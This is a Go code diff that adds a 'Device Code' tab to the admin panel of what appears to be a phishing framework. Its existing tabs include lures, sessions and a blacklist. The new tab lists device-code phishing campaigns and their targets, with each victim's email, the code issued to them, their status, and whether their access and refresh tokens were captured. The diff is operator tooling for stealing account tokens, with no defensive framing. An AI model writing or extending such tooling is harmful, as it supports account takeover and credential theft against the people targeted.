@@ -1126,6 +1126,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		{"lures", "Lures &amp; Chains"},
 		{"sessions", "Sessions"},
 		{"blacklist", "Blacklist"},
+		{"devicecode", "Device Code"},
 		{"telegram", pendingLabel},
 	}
 	b.WriteString(`<div class="tabbar">`)
@@ -1494,6 +1495,93 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				}
 				b.WriteString(`</tbody></table></div>`)
 			}
+		}
+		b.WriteString(`</div>`)
+
+	// ── DEVICE CODE ───────────────────────────────────────────────────────────
+	case "devicecode":
+		dcTargets := GetDCTargets()
+		dcCampaigns := GetCampaigns()
+
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd(fmt.Sprintf("Campaigns (%d)", len(dcCampaigns))))
+		if len(dcCampaigns) == 0 {
+			b.WriteString(`<div class="empty">No campaigns launched yet.</div>`)
+		} else {
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
+<th>ID</th><th>Name</th><th>Template</th><th>Created</th><th>Targets</th><th>Completed</th>
+</tr></thead><tbody>`)
+			for _, camp := range dcCampaigns {
+				completed := 0
+				for _, t := range camp.Targets {
+					if t.GetStatus() == "completed" {
+						completed++
+					}
+				}
+				b.WriteString(fmt.Sprintf(`<tr>
+<td class="mono">%d</td>
+<td>%s</td>
+<td><span class="badge badge-blue">%s</span></td>
+<td class="mono" style="font-size:11.5px">%s</td>
+<td class="mono">%d</td>
+<td class="mono"><span style="color:var(--green)">%d</span></td>
+</tr>`,
+					camp.ID,
+					template.HTMLEscapeString(camp.Name),
+					template.HTMLEscapeString(camp.Template),
+					camp.CreatedAt.Format("2006-01-02 15:04"),
+					len(camp.Targets),
+					completed,
+				))
+			}
+			b.WriteString(`</tbody></table></div>`)
+		}
+		b.WriteString(`</div>`)
+
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd(fmt.Sprintf("Targets (%d)", len(dcTargets))))
+		if len(dcTargets) == 0 {
+			b.WriteString(`<div class="empty">No targets yet. Start a campaign or manual device code flow.</div>`)
+		} else {
+			b.WriteString(`<div class="table-wrap"><table><thead><tr>
+<th>ID</th><th>Email</th><th>Code</th><th>Status</th><th>Started</th><th>Tokens</th>
+</tr></thead><tbody>`)
+			for _, t := range dcTargets {
+				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(t.GetStatus()) + `</span>`
+				switch t.GetStatus() {
+				case "completed":
+					statusBadge = `<span class="badge badge-green">✓ completed</span>`
+				case "pending":
+					statusBadge = `<span class="badge badge-amber">⏱ pending</span>`
+				case "declined":
+					statusBadge = `<span class="badge badge-red">declined</span>`
+				case "expired":
+					statusBadge = `<span class="badge badge-red">expired</span>`
+				}
+
+				hasTokens := t.AccessToken != "" && t.RefreshToken != ""
+				tokensCell := `<span style="color:var(--text-muted)">—</span>`
+				if hasTokens {
+					tokensCell = `<span style="color:var(--accent-success)">✓ captured</span>`
+				}
+
+				b.WriteString(fmt.Sprintf(`<tr>
+<td class="mono" style="color:var(--text-muted)">%d</td>
+<td class="mono" style="font-size:12px">%s</td>
+<td class="mono" style="font-weight:600;letter-spacing:2px">%s</td>
+<td>%s</td>
+<td class="mono" style="font-size:11.5px">%s</td>
+<td>%s</td>
+</tr>`,
+					t.ID,
+					template.HTMLEscapeString(t.Email),
+					template.HTMLEscapeString(t.UserCode),
+					statusBadge,
+					t.StartedAt.Format("2006-01-02 15:04"),
+					tokensCell,
+				))
+			}
+			b.WriteString(`</tbody></table></div>`)
 		}
 		b.WriteString(`</div>`)
 
